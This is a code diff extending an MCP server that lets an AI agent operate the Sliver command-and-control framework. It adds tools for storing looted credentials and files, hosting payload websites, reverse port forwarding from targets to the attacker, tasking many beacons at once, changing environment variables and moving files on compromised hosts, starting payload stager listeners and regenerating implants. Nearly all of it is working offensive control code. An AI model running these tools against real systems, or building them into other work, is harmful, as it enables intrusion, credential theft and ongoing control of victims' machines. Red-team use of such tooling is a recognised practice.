+    # ========== REGENERATE IMPLANT ==========
+    elif command == "regenerate":
+        implant_name = params.get("implant_name", "")
+        resp = await client.regenerate_implant(implant_name)
+        return {"name": implant_name, "size": len(resp.File.Data) if resp.File else 0}
+
+    # ========== WG CONFIG ==========
+    elif command == "wg_config":
+        resp = await client.generate_wg_client_config()
+        return {"config": resp if isinstance(resp, str) else str(resp)}
+
+    # ========== CANARIES ==========
+    elif command == "canaries":
+        resp = await client.canaries()
+        if not resp:
+            return []
+        return [{
+            "implant_name": c.ImplantName,
+            "domain": c.Domain,
+            "triggered": c.Triggered,
+            "first_trigger": c.FirstTrigger,
+            "latest_trigger": c.LatestTrigger,
+        } for c in resp]
+
     else:
         return {"error": f"Unknown command: {command}"}
 
 asyncio.run(main())
 `;
 
-    const beaconTimeout = typeof params.timeout === "number" ? params.timeout * 1000 : 0;
+    const beaconTimeout = params.timeout ? (typeof params.timeout === "number" ? params.timeout * 1000 : parseInt(String(params.timeout)) * 1000) : 0;
     const spawnTimeout = Math.max(config.timeout, beaconTimeout + 30000);
     const python = spawn(config.pythonPath, ["-c", pythonScript], {
       timeout: spawnTimeout,
@@ -2765,6 +3257,348 @@ const SLIVER_TOOLS: Tool[] = [
       required: [],
     },
   },
+  // ========== LOOT ==========
+  {
+    name: "sliver_loot_list",
+    description: "List all loot stored on the server",
+    inputSchema: {
+      type: "object",
+      properties: {},
+      required: [],
+    },
+  },
+  {
+    name: "sliver_loot_add",
+    description: "Add loot (credentials or file) to the server store",
+    inputSchema: {
+      type: "object",
+      properties: {
+        name: { type: "string", description: "Loot name" },
+        loot_type: { type: "number", description: "1=credential, 2=file" },
+        credential_type: { type: "number", description: "0=none, 1=user/pass, 2=api_key" },
+        user: { type: "string", description: "Username (for credential)" },
+        password: { type: "string", description: "Password or API key (for credential)" },
+        file_type: { type: "number", description: "0=none, 1=binary, 2=text" },
+        file_name: { type: "string", description: "File name" },
+        file_data: { type: "string", description: "File content as base64" },
+      },
+      required: ["name", "loot_type"],
+    },
+  },
+  {
+    name: "sliver_loot_rm",
+    description: "Remove loot by ID",
+    inputSchema: {
+      type: "object",
+      properties: {
+        loot_id: { type: "string", description: "Loot ID to remove" },
+      },
+      required: ["loot_id"],
+    },
+  },
+  {
+    name: "sliver_loot_content",
+    description: "Get loot content (credentials or file data) by ID",
+    inputSchema: {
+      type: "object",
+      properties: {
+        loot_id: { type: "string", description: "Loot ID" },
+      },
+      required: ["loot_id"],
+    },
+  },
+  // ========== WEBSITES ==========
+  {
+    name: "sliver_websites_list",
+    description: "List all hosted websites on the C2 server",
+    inputSchema: {
+      type: "object",
+      properties: {},
+      required: [],
+    },
+  },
+  {
+    name: "sliver_website_content",
+    description: "List content paths for a website",
+    inputSchema: {
+      type: "object",
+      properties: {
+        name: { type: "string", description: "Website name" },
+      },
+      required: ["name"],
+    },
+  },
+  {
+    name: "sliver_website_add_content",
+    description: "Add content to a website (creates website if not exists)",
+    inputSchema: {
+      type: "object",
+      properties: {
+        name: { type: "string", description: "Website name" },
+        path: { type: "string", description: "URL path (e.g. /index.html)" },
+        content_type: { type: "string", description: "MIME type (default: text/html)" },
+        content_b64: { type: "string", description: "Content as base64" },
+      },
+      required: ["name", "path", "content_b64"],
+    },
+  },
+  {
+    name: "sliver_website_remove_content",
+    description: "Remove content paths from a website",
+    inputSchema: {
+      type: "object",
+      properties: {
+        name: { type: "string", description: "Website name" },
+        paths: { type: "array", items: { type: "string" }, description: "Paths to remove" },
+      },
+      required: ["name", "paths"],
+    },
+  },
+  {
+    name: "sliver_website_remove",
+    description: "Remove an entire website",
+    inputSchema: {
+      type: "object",
+      properties: {
+        name: { type: "string", description: "Website name to remove" },
+      },
+      required: ["name"],
+    },
+  },
+  // ========== REVERSE PORT FORWARD ==========
+  {
+    name: "sliver_rportfwd_list",
+    description: "List reverse port forwards on a session",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+      },
+      required: ["session_id"],
+    },
+  },
+  {
+    name: "sliver_rportfwd_start",
+    description: "Start a reverse port forward on a session (listen on target, forward to attacker)",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        bind_address: { type: "string", description: "Bind address on target (default: 0.0.0.0)" },
+        bind_port: { type: "number", description: "Port to listen on target" },
+        forward_address: { type: "string", description: "Forward destination host (default: 127.0.0.1)" },
+        forward_port: { type: "number", description: "Forward destination port" },
+      },
+      required: ["session_id", "bind_port", "forward_port"],
+    },
+  },
+  {
+    name: "sliver_rportfwd_stop",
+    description: "Stop a reverse port forward on a session",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        listener_id: { type: "number", description: "Listener ID to stop" },
+      },
+      required: ["session_id", "listener_id"],
+    },
+  },
+  {
+    name: "sliver_beacon_rportfwd_list",
+    description: "List reverse port forwards on a beacon (async)",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        timeout: { type: "number", description: "Timeout in seconds (default: 120)" },
+      },
+      required: ["beacon_id"],
+    },
+  },
+  {
+    name: "sliver_beacon_rportfwd_start",
+    description: "Start a reverse port forward on a beacon (async)",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        bind_address: { type: "string", description: "Bind address on target (default: 0.0.0.0)" },
+        bind_port: { type: "number", description: "Port to listen on target" },
+        forward_address: { type: "string", description: "Forward destination host (default: 127.0.0.1)" },
+        forward_port: { type: "number", description: "Forward destination port" },
+        timeout: { type: "number", description: "Timeout in seconds (default: 120)" },
+      },
+      required: ["beacon_id", "bind_port", "forward_port"],
+    },
+  },
+  {
+    name: "sliver_beacon_rportfwd_stop",
+    description: "Stop a reverse port forward on a beacon (async)",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        listener_id: { type: "number", description: "Listener ID to stop" },
+      },
+      required: ["beacon_id", "listener_id"],
+    },
+  },
+  // ========== TASKMANY ==========
+  {
+    name: "sliver_taskmany",
+    description: "Execute a command on multiple beacons or sessions at once",
+    inputSchema: {
+      type: "object",
+      properties: {
+        target_type: { type: "string", enum: ["beacon", "session"], description: "Target type (default: beacon)" },
+        target_ids: { type: "array", items: { type: "string" }, description: "List of beacon or session IDs" },
+        command: { type: "string", description: "Command name to execute (e.g. beacon_execute, beacon_screenshot)" },
+        command_params: { type: "object", description: "Parameters for the command (beacon_id/session_id added automatically)" },
+      },
+      required: ["target_ids", "command"],
+    },
+  },
+  // ========== BEACON SET/UNSET ENV ==========
+  {
+    name: "sliver_beacon_set_env",
+    description: "Set an environment variable on a beacon (async)",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        name: { type: "string", description: "Variable name" },
+        value: { type: "string", description: "Variable value" },
+        timeout: { type: "number", description: "Timeout in seconds (default: 120)" },
+      },
+      required: ["beacon_id", "name", "value"],
+    },
+  },
+  {
+    name: "sliver_beacon_unset_env",
+    description: "Unset an environment variable on a beacon (async)",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        name: { type: "string", description: "Variable name to unset" },
+        timeout: { type: "number", description: "Timeout in seconds (default: 120)" },
+      },
+      required: ["beacon_id", "name"],
+    },
+  },
+  {
+    name: "sliver_unset_env",
+    description: "Unset an environment variable on a session",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        name: { type: "string", description: "Variable name to unset" },
+      },
+      required: ["session_id", "name"],
+    },
+  },
+  // ========== MV (move/rename file) ==========
+  {
+    name: "sliver_mv",
+    description: "Move/rename a file on a session",
+    inputSchema: {
+      type: "object",
+      properties: {
+        session_id: { type: "string", description: "Session ID" },
+        src: { type: "string", description: "Source path" },
+        dst: { type: "string", description: "Destination path" },
+      },
+      required: ["session_id", "src", "dst"],
+    },
+  },
+  {
+    name: "sliver_beacon_mv",
+    description: "Move/rename a file on a beacon (async)",
+    inputSchema: {
+      type: "object",
+      properties: {
+        beacon_id: { type: "string", description: "Beacon ID" },
+        src: { type: "string", description: "Source path" },
+        dst: { type: "string", description: "Destination path" },
+        timeout: { type: "number", description: "Timeout in seconds (default: 120)" },
+      },
+      required: ["beacon_id", "src", "dst"],
+    },
+  },
+  // ========== STAGE LISTENER ==========
+  {
+    name: "sliver_start_http_stager",
+    description: "Start an HTTP stager listener",
+    inputSchema: {
+      type: "object",
+      properties: {
+        host: { type: "string", description: "Listen host (default: 0.0.0.0)" },
+        port: { type: "number", description: "Listen port (default: 8443)" },
+        data_b64: { type: "string", description: "Stage data as base64" },
+      },
+      required: ["port"],
+    },
+  },
+  {
+    name: "sliver_start_https_stager",
+    description: "Start an HTTPS stager listener",
+    inputSchema: {
+      type: "object",
+      properties: {
+        host: { type: "string", description: "Listen host (default: 0.0.0.0)" },
+        port: { type: "number", description: "Listen port (default: 8443)" },
+        data_b64: { type: "string", description: "Stage data as base64" },
+      },
+      required: ["port"],
+    },
+  },
+  {
+    name: "sliver_start_tcp_stager",
+    description: "Start a TCP stager listener",
+    inputSchema: {
+      type: "object",
+      properties: {
+        host: { type: "string", description: "Listen host (default: 0.0.0.0)" },
+        port: { type: "number", description: "Listen port (default: 8443)" },
+        data_b64: { type: "string", description: "Stage data as base64" },
+      },
+      required: ["port"],
+    },
+  },
+  // ========== REGENERATE ==========
+  {
+    name: "sliver_regenerate",
+    description: "Regenerate an implant binary by name",
+    inputSchema: {
+      type: "object",
+      properties: {
+        implant_name: { type: "string", description: "Implant name to regenerate" },
+      },
+      required: ["implant_name"],
+    },
+  },
+  // ========== WG CONFIG ==========
+  {
+    name: "sliver_wg_config",
+    description: "Generate a WireGuard client config",
+    inputSchema: {
+      type: "object",
+      properties: {},
+      required: [],
+    },
+  },
+  // ========== CANARIES ==========
+  {
+    name: "sliver_canaries",
+    description: "List DNS canaries",
+    inputSchema: {
+      type: "object",
+      properties: {},
+      required: [],
+    },
+  },
 ];
 
 // Create the MCP server
@@ -3099,6 +3933,107 @@ server.setRequestHandler(CallToolRequestSchema, async (request) => {
 
       case "sliver_hosts":
         result = await executeSliverCommand("hosts");
+        break;
+
+      // Loot
+      case "sliver_loot_list":
+        result = await executeSliverCommand("loot_list");
+        break;
+      case "sliver_loot_add":
+        result = await executeSliverCommand("loot_add", args as Record<string, unknown>);
+        break;
+      case "sliver_loot_rm":
+        result = await executeSliverCommand("loot_rm", args as Record<string, unknown>);
+        break;
+      case "sliver_loot_content":
+        result = await executeSliverCommand("loot_content", args as Record<string, unknown>);
+        break;
+
+      // Websites
+      case "sliver_websites_list":
+        result = await executeSliverCommand("websites_list");
+        break;
+      case "sliver_website_content":
+        result = await executeSliverCommand("website_content", args as Record<string, unknown>);
+        break;
+      case "sliver_website_add_content":
+        result = await executeSliverCommand("website_add_content", args as Record<string, unknown>);
+        break;
+      case "sliver_website_remove_content":
+        result = await executeSliverCommand("website_remove_content", args as Record<string, unknown>);
+        break;
+      case "sliver_website_remove":
+        result = await executeSliverCommand("website_remove", args as Record<string, unknown>);
+        break;
+
+      // Reverse Port Forward
+      case "sliver_rportfwd_list":
+        result = await executeSliverCommand("rportfwd_list", args as Record<string, unknown>);
+        break;
+      case "sliver_rportfwd_start":
+        result = await executeSliverCommand("rportfwd_start", args as Record<string, unknown>);
+        break;
+      case "sliver_rportfwd_stop":
+        result = await executeSliverCommand("rportfwd_stop", args as Record<string, unknown>);
+        break;
+      case "sliver_beacon_rportfwd_list":
+        result = await executeSliverCommand("beacon_rportfwd_list", args as Record<string, unknown>);
+        break;
+      case "sliver_beacon_rportfwd_start":
+        result = await executeSliverCommand("beacon_rportfwd_start", args as Record<string, unknown>);
+        break;
+      case "sliver_beacon_rportfwd_stop":
+        result = await executeSliverCommand("beacon_rportfwd_stop", args as Record<string, unknown>);
+        break;
+
+      // TaskMany
+      case "sliver_taskmany":
+        result = await executeSliverCommand("taskmany", args as Record<string, unknown>);
+        break;
+
+      // Beacon set/unset env
+      case "sliver_beacon_set_env":
+        result = await executeSliverCommand("beacon_set_env", args as Record<string, unknown>);
+        break;
+      case "sliver_beacon_unset_env":
+        result = await executeSliverCommand("beacon_unset_env", args as Record<string, unknown>);
+        break;
+      case "sliver_unset_env":
+        result = await executeSliverCommand("session_unset_env", args as Record<string, unknown>);
+        break;
+
+      // MV
+      case "sliver_mv":
+        result = await executeSliverCommand("session_mv", args as Record<string, unknown>);
+        break;
+      case "sliver_beacon_mv":
+        result = await executeSliverCommand("beacon_mv", args as Record<string, unknown>);
+        break;
+
+      // Stage listeners
+      case "sliver_start_http_stager":
+        result = await executeSliverCommand("start_http_stager", args as Record<string, unknown>);
+        break;
+      case "sliver_start_https_stager":
+        result = await executeSliverCommand("start_https_stager", args as Record<string, unknown>);
+        break;
+      case "sliver_start_tcp_stager":
+        result = await executeSliverCommand("start_tcp_stager", args as Record<string, unknown>);
+        break;
+
+      // Regenerate
+      case "sliver_regenerate":
+        result = await executeSliverCommand("regenerate", args as Record<string, unknown>);
+        break;
+
+      // WG Config
+      case "sliver_wg_config":
+        result = await executeSliverCommand("wg_config");
+        break;
+
+      // Canaries
+      case "sliver_canaries":
+        result = await executeSliverCommand("canaries");
         break;
 
       default:
